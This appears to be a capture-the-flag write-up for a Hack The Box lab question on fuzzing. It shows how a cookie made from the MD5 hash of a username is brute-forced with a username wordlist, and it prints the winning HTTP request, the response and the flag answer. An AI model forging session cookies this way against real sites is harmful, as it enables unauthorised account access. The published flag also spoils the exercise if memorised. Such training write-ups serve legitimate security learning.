# ZAP Fuzzer
## Questions
1. The directory we found above sets the cookie to the md5 hash of the username, as we can see the md5 cookie in the request for the (guest) user. Visit '/skills/' to get a request with a cookie, then try to use ZAP Fuzzer to fuzz the cookie for different md5 hashed usernames to get the flag. Use the "top-usernames-shortlist.txt" wordlist from Seclists. **Answer: HTB{fuzz1n6_my_f1r57_c00k13}**
   - Use Burp's Intruder with `/usr/share/seclists/Usernames/top-usernames-shortlist.txt`, set the username as the payload then apply MD5 hash to it. This request got the response with the flag:
        ```
        GET /skills/ HTTP/1.1
        Host: 154.57.164.67:30387
        Cache-Control: max-age=0
        Cookie: cookie=ee11cbb19052e40b07aac0ca060c23ee
        Sec-Ch-Ua: "Google Chrome";v="140", "Not=A?Brand";v="8", "Chromium";v="140"
        Sec-Ch-Ua-Mobile: ?0
        Sec-Ch-Ua-Platform: "Linux"
        Accept-Language: en-US;q=0.9,en;q=0.8
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Sec-Fetch-Site: none
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive
        ```
        ```
        HTTP/1.1 200 OK
        Date: Thu, 07 May 2026 10:37:05 GMT
        Server: Apache/2.4.41 (Ubuntu)
        Set-Cookie: cookie=084e0343a0486ff05530df6c705c8bb4
        Vary: Accept-Encoding
        Content-Length: 450
        Keep-Alive: timeout=5, max=100
        Connection: Keep-Alive
        Content-Type: text/html; charset=UTF-8


        <!DOCTYPE html>
        <html lang="en">

        <head>
            <meta charset="UTF-8">
            <title>Welcome</title>

        </head>

        <body style="background-color: #141d2b; font-family: sans-serif; color: white;">
            <center>
                            <div class='control'>
                        <h1>
                            Welcome Back user
                        </h1>
                    </div>
                    <br><br>
                    HTB{fuzz1n6_my_f1r57_c00k13}
                            </center>
        </body>

        </html>
        ```